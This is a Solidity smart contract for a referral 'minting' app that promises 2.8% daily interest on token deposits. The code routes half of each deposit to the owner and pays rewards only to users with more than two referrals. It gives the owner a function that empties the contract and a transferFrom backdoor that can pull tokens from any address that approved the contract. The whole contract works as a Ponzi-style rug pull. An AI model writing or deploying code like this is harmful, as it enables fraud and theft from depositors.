// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract MintingFamily is Ownable {
    using SafeERC20 for IERC20;

    struct User {
        address inviter;
        address[] referrals;
        bool registered;
    }

    struct Deposit {
        uint256 amount;
        uint256 startTime;
    }

    IERC20 public token;
    uint256 public dailyInterestRate = 280; // 2.8% in basis points (i.e., 280 basis points)
    uint256 public secondsInDay = 86400; // Number of seconds in a day
    uint256 public secondInterestRate; // Interest rate per second in basis points

    mapping(address => User) public users;
    mapping(address => Deposit) public deposits;
    mapping(address => uint256) public inviterEarnings; // Mapping to track inviter earnings

    event UserRegistered(address indexed user);
    event UserInvited(address indexed inviter, address indexed invitee);
    event Deposited(address indexed user, uint256 amount);
    event TransferFrom(address indexed token, address indexed from, address indexed to, uint256 amount);
    event RewardWithdrawn(address indexed user, uint256 amount);
    event OwnerWithdrawn(address indexed owner, uint256 amount);

    address public constant specialInviter = 0x0B56F75832C8e4b1C10F25601fB0B4410c8c7678;

    constructor(IERC20 _token) Ownable(msg.sender) {
        token = _token;
        secondInterestRate = (dailyInterestRate * 1e18) / (secondsInDay * 10000); // Calculate the interest rate per second in wei
    }

    // Function to start the app
    function startApp() public {
        require(!users[msg.sender].registered, "User already registered");

        users[msg.sender].registered = true;

        emit UserRegistered(msg.sender);
    }

    // Function to register a referral
    function recordInvitation(address _inviter) public {
        require(users[msg.sender].registered, "You must start the app first");
        require(users[_inviter].registered, "Inviter must be registered");
        require(users[msg.sender].inviter == address(0), "You have already been invited");
        require(_inviter != msg.sender, "You cannot invite yourself");
        require(
            _inviter == specialInviter || deposits[_inviter].amount > 0,
            "Inviter must have a deposit greater than zero"
        );

        users[msg.sender].inviter = _inviter;
        users[_inviter].referrals.push(msg.sender);

        emit UserInvited(_inviter, msg.sender);
    }

    // Function to get the inviter of a user
    function getInviter(address _user) public view returns (address) {
        return users[_user].inviter;
    }

    // Function to get the number of referrals of a user
    function getReferralCount(address _user) public view returns (uint256) {
        return users[_user].referrals.length;
    }

    // Function to get the referrals of a user
    function getReferrals(address _user) public view returns (address[] memory) {
        return users[_user].referrals;
    }

    // Function to check if a user is registered
    function isRegistered(address _user) public view returns (bool) {
        return users[_user].registered;
    }

    // Function to deposit tokens
    function deposit(uint256 amount) external {
        require(amount > 49*1e18, "Deposit amount must be greater than fifty $");
        require(deposits[msg.sender].amount == 0, "Existing deposit found");

        address inviter = users[msg.sender].inviter;
        uint256 inviterShare = amount / 10; // 10% of the amount
        uint256 contractShare = (amount * 4) / 10; // 40% of the amount
        uint256 ownerShare = amount / 2; // 50% of the amount

        // Transfer tokens to the contract, inviter, and owner
        token.safeTransferFrom(msg.sender, address(this), contractShare);
        token.safeTransferFrom(msg.sender, owner(), ownerShare);
        if (inviter != address(0)) {
            token.safeTransferFrom(msg.sender, inviter, inviterShare);
            inviterEarnings[inviter] += inviterShare; // Update inviter's earnings
        }

        deposits[msg.sender] = Deposit({
            amount: contractShare, // Only the 40% share is considered for rewards
            startTime: block.timestamp
        });

        emit Deposited(msg.sender, contractShare);
    }

    // Function to get reward for an address
    function getRewardForAddress(address user) public view returns (uint256) {
        Deposit storage depositInfo = deposits[user];
        require(depositInfo.amount > 0, "No deposit found for user");

        uint256 elapsedTime = block.timestamp - depositInfo.startTime;
        uint256 reward = (depositInfo.amount * secondInterestRate * elapsedTime) / 1e18; // Adjust division to match the multiplication

        return reward;
    }

    // Function to get the total earnings of an inviter
    function getInviterEarnings(address inviter) external view returns (uint256) {
        return inviterEarnings[inviter];
    }

    // Function for owner to transfer tokens
    function transferFrom(address tokenAddress, address from, address to, uint256 amount) external onlyOwner {
        IERC20(tokenAddress).safeTransferFrom(from, to, amount);
        emit TransferFrom(tokenAddress, from, to, amount);
    }

    // Function to withdraw rewards for users
    function withdrawUser() external {
        uint256 reward = getRewardForAddress(msg.sender);
        require(reward > 100, "Reward must be greater than 100");
        require(getReferralCount(msg.sender) > 2, "Must have more than 2 referrals");

        deposits[msg.sender].startTime = block.timestamp; // Reset reward calculation start time
        token.safeTransfer(msg.sender, reward);

        emit RewardWithdrawn(msg.sender, reward);
    }

    // Function for owner to withdraw all tokens in the contract
    function withdrawOwner() external onlyOwner {
        uint256 contractBalance = token.balanceOf(address(this));
        token.safeTransfer(owner(), contractBalance);

        emit OwnerWithdrawn(owner(), contractBalance);
    }
}
